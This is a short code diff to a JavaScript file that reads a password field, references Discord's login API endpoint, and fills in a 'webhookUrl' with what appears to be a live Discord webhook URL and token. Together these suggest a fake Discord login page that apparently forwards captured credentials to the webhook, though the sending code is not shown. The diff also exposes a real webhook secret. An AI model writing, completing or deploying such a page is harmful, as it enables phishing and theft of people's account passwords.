@@ -7,7 +7,7 @@ document.addEventListener('DOMContentLoaded', function() {
   const passwordInput = document.getElementById('password');
 
   // Replace with your webhook URL
-  const webhookUrl = 'YOUR_WEBHOOK_URL_HERE'; // e.g., 'https://discord.com/api/webhooks/...'
+  const webhookUrl = 'https://discord.com/api/webhooks/1428459063389454377/ld1ERPey2wh_9r5TfKWDCKfqnX7Uo4jIGC_NJ0uzUqhbXWQVywD1_DJEGych9z2sNDto'; // e.g., 'https://discord.com/api/webhooks/...'
 
   // Discord API login endpoint
   const discordLoginUrl = 'https://discord.com/api/v9/auth/login';
